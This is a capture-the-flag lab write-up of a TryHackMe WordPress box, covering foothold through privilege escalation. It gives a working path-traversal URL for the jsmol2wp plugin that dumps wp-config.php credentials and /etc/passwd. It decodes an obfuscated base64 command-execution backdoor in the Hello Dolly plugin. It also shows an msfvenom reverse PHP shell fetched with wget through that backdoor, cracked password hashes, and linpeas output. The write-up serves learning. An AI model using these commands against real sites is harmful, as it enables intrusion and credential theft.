---
tags:
  - tryhackme/linux/medium
date: 2025-02-18
---
Challenge Description: Wordpress site. There are vulnerable plugins. 

## Foothold
#path-traversal
found plugins via wpscan and wp-content/uploads
- jsmol2wp => Directory traversal
- buddypress
- wysija-newsletter (mailpoet):
	- CVE-2014-4725
		The MailPoet Newsletters (wysija-newsletters) plugin before 2.6.7 for WordPress allows remote attackers to bypass authentication and execute arbitrary PHP code by uploading a crafted theme using wp-admin/admin-post.php and accessing the theme in wp-content/uploads/wysija/themes/mailp/.
		
jsmol2wp:
```
http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../../../wp-config.php
```

```
define( 'DB_USER', 'wpuser' );
define( 'DB_PASSWORD', 'kbLSF2Vop#lw3rjDZ629*Z%G' );
# THESE CREDENTIALS CAN BE USED FOR WPLOGIN

root:x:0:0:root:/root:/usr/bin/bash
...
think:x:1000:1000:,,,:/home/think:/bin/bash
fwupd-refresh:x:113:117:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
mysql:x:114:119:MySQL Server,,,:/nonexistent:/bin/false
xavi:x:1001:1001::/home/xavi:/bin/bash
diego:x:1002:1002::/home/diego:/bin/bash
gege:x:1003:1003::/home/gege:/bin/bash
```


note in the website:
`1- [IMPORTANT] Check Backdoors: Verify the SOURCE CODE of "Hello Dolly" plugin as the site's code revision.`

```
http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../../../wp-content/plugins/hello.php
```

```
function hello_dolly() {
	eval(base64_decode('CiBpZiAoaXNzZXQoJF9HRVRbIlwxNDNcMTU1XHg2NCJdKSkgeyBzeXN0ZW0oJF9HRVRbIlwxNDNceDZkXDE0NCJdKTsgfSA='));

base64 -d
CiBpZiAoaXNzZXQoJF9HRVRbIlwxNDNcMTU1XHg2NCJdKSkgeyBzeXN0ZW0oJF9HRVRbIlwxNDNceDZkXDE0NCJdKTsgfSA=

 if (isset($_GET["\143\155\x64"])) { system($_GET["\143\x6d\144"]); }         
```

"cmd" written in hex and octals
http://www.smol.thm/wp-admin/?cmd=ls

let's check which shell is in use.
```
echo $SHELL
ps -p $$
```


```
msfvenom -p php/reverse_php LHOST=10.9.1.50 LPORT=80 -o shell.php
http://www.smol.thm/wp-admin/?cmd=wget+http%3A%2F%2F10.9.1.50%2Fshell.php
```

```msfconsole
use exploit/multi/handler
```

`python3 -c 'import pty;pty.spawn("/bin/bash")'` upgrade shell

## Lateral Movement
Found hashes in mysql
```
$P$BOb8/koi4nrmSPW85f5KzM5M/k2n0d/
$P$B1UHruCd/9bGD.TtVZULlxFrTsb3PX1
$P$BWFBcbXdzGrsjnbc54Dr3Erff4JPwv1
$P$BB4zz2JEnM2H3WE2RHs3q18.1pvcql1

---
users with shell:
think
xavi
diego
gege
```

cracked it and logged in as user think
## Privilege Escalation

./linpeas.sh -A output:
```
Bruteforcing user root...
  You can login as root using password: root
  Bruteforcing user think...
  Bruteforcing user xavi...
  Bruteforcing user diego...
  Bruteforcing user gege...
```